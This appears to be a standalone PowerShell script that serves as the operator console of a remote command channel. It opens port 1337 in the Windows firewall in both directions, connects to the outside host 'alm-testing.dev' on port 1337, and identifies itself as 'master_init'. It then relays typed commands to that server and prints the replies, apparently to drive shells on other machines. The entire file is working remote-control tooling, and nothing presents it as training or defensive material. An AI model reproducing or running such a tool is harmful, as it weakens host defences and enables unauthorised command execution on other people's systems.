if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort 1337 -Protocol TCP -Action Allow
} 

if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
} 
$cmd_wait = $true;
$read_start = $false

try {
	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
	$client.ReceiveTimeout = 5000;
	$stream = $client.GetStream();
	$stream.ReadTimeout = 10000;
	$stream.WriteTimeout = 10000;
	$writer = New-Object System.IO.StreamWriter($stream);
	$reader = New-Object System.IO.StreamReader($stream);
	$writer.WriteLine("master_init");
	$writer.Flush();

	$in_buff = [char[]]::new(2048)
	$exit = 0;
	while ($exit -eq 0) {
		if($client.Client.Poll(50000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
			if ($client.Client.Available -eq 0) {
				Write-Output "Connection to server lost";
				$exit = 1;
			} else {
				$in_stream = $client.GetStream();
				$in_reader = New-Object System.IO.StreamReader($in_stream);
				while ($in_reader.Peek() -ge 0) {	
					$read_start = $true;	
					$in_buff = $in_reader.ReadLine();
					$join = $in_buff -join "";
					$trimmed = $join -replace '\r?\n\z';
					Write-Output $trimmed;
				}
				if ($read_start -eq $true) {
					$cmd_wait = $false;
					$read_start = $false;
				}
			}				
		} 
		
		if ($exit -ne 1 -and $cmd_wait -eq $false) {
			$cmd = Read-host "cmd";
			if ($cmd -ne "") {
				$writer.WriteLine($cmd);
				$writer.Flush();
				$cmd_wait = $true;
			}
		}
	}
}
catch {
	Write-Output $_;
}